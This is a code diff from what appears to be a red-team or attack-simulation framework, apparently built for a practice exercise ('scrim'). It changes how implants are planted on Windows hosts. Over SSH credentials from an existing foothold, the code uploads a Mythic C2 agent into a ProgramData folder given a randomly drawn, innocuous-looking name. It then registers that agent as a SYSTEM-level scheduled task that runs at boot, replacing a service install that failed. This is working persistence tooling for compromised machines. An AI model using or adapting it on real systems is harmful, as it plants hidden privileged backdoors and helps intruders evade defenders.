@@ -187,33 +187,54 @@ class Planter:
                 "check_cmd": f"systemctl is-active {unit}"}
 
     def _install_windows(self, ip, box_id, local, transport):
+        """Install the frozen payload as an ONSTART scheduled task running as SYSTEM.
+
+        A Mythic console agent (apollo) is NOT a service binary: `New-Service`
+        registers it and `Start-Service` then dies with 1053 ("did not respond in
+        a timely manner"). That is what every Windows box reported on the
+        2026-10-18 scrim — `service install rc=1: #< CLIXML …`, 0/26. A scheduled
+        task runs the console agent as SYSTEM at boot and can be started
+        immediately, so the channel comes up without a service wrapper.
+        """
+        from ..effects import artifactnames as names
         fh = self.ctx.world.foothold(ip)
         if not fh:
             return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
-        remote = f"C:\\Windows\\System32\\{box_id}.exe"
+        drawn = names.windows_names(self.ctx.world, rng=self.ctx.rng,
+                                    mode=names.mode_from_cfg(self.ctx.cfg))
+        task = drawn["task"]
+        remote_dir = f"C:\\ProgramData\\{drawn['stem']}"
+        remote = f"{remote_dir}\\{box_id}.exe"
+        staged = f"C:/ProgramData/{drawn['stem']}/{box_id}.exe"
         try:
+            self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
+                             f'powershell -NoProfile -Command "New-Item -ItemType '
+                             f'Directory -Force -Path \'{remote_dir}\' | Out-Null"',
+                             timeout=90, key_path=fh.get("key_path"))
             self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
-                                  "/" + remote.replace("\\", "/"),
-                                  key_path=fh.get("key_path"))
-        except Exception as exc:
+                                  staged, key_path=fh.get("key_path"))
+        except Exception as exc:                       # transport blowups are data
             return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                     "paths": [remote]}
-        script = (
-            f"$s = New-Service -Name '{box_id}' -BinaryPathName '{remote}' "
-            "-StartupType Automatic -ErrorAction Stop; "
-            f"Start-Service -Name '{box_id}' -ErrorAction Stop; "
-            f"(Get-Service -Name '{box_id}').Status")
-        rc, out, err = self.ctx.ssh.ssh_ps(ip, fh["user"], fh.get("password") or "",
-                                           script, timeout=180,
-                                           key_path=fh.get("key_path"))
-        status = (out or "").strip().splitlines()[-1] if (out or "").strip() else ""
-        ok = rc == 0 and status == "Running"
+        # /F makes the create idempotent; the query is the proof, not the rc (a
+        # second /Run of an already-running task answers non-zero).
+        script = (f'schtasks /Create /TN "{task}" /TR "{remote}" /SC ONSTART /RU SYSTEM '
+                  f'/RL HIGHEST /F && schtasks /Run /TN "{task}" & '
+                  f'schtasks /Query /TN "{task}" /FO LIST')
+        rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
+                                        script, timeout=180,
+                                        key_path=fh.get("key_path"))
+        status = ""
+        for line in (out or "").splitlines():
+            if line.strip().lower().startswith("status:"):
+                status = line.split(":", 1)[1].strip()
+        ok = status.lower() == "running"
         return {"ok": ok,
-                "detail": (f"service {box_id} Running on {ip} (transport {transport})"
-                           if ok else
-                           f"service install rc={rc}: {(err or out).strip()[:200]}"),
-                "unit": box_id, "paths": [remote],
-                "check_cmd": f"(Get-Service -Name '{box_id}').Status"}
+                "detail": (f"task {task} Running on {ip} (transport {transport})" if ok
+                           else f"task install rc={rc} status={status or '?'}: "
+                                f"{(err or out).strip()[:200]}"),
+                "unit": task, "paths": [remote, f"task:{task}"],
+                "check_cmd": f'schtasks /Query /TN "{task}" /FO LIST'}
 
     # -- evidence -----------------------------------------------------------
 
